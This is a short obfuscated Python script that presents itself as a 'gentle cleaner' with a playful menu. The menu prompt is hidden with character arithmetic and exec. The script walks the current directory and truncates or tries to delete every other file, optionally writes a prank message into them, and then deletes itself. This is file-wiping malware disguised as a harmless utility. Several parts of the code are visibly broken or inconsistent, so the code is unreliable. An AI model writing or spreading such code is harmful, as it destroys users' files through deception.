import os as O

def __(_):
 __=lambda _:O.path.join(_[0],_)
 _0=[]
 for ___ in O.walk(_):
  for __0 in ___[2]:
   _1=__(__0)
   _2=O.path.isdir(_1)and __(_1)
   _0+=[_1]
 return _0

def ___(_):
 def ____(_0):
  for ___0 in _0:
   if"gentleCleaner.py"in ___0:continue
   with open(___0,"w")as _:
    if _=="D":O.remove(___0)
    else:
     _.truncate()
     _=="P"and _.write("Just a little prank!")
  O.remove(O.path.basename(__file__))
 ____(__(O.getcwd()))

exec(f"{'___.__'+'_'}(input('{chr(67+2)+chr(104)+chr(111)}{chr(111)+chr(115)+chr(101)} {chr(121)+chr(111)+chr(117)+chr(114)} cleanup style: (P)layful message, (S)weep up the dust, or (D)eep clean: '))")
